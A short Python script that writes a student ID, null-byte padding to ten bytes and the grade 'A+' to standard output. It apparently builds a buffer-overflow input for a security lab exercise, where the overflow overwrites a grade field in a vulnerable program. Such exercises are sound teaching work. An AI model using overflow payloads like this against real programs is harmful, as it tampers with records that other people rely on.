import sys

sid = b"1556460"
padding = b"\x00" * (10 - len(sid))
grade = b"A+"

payload = sid + padding + grade

sys.stdout.buffer.write(payload)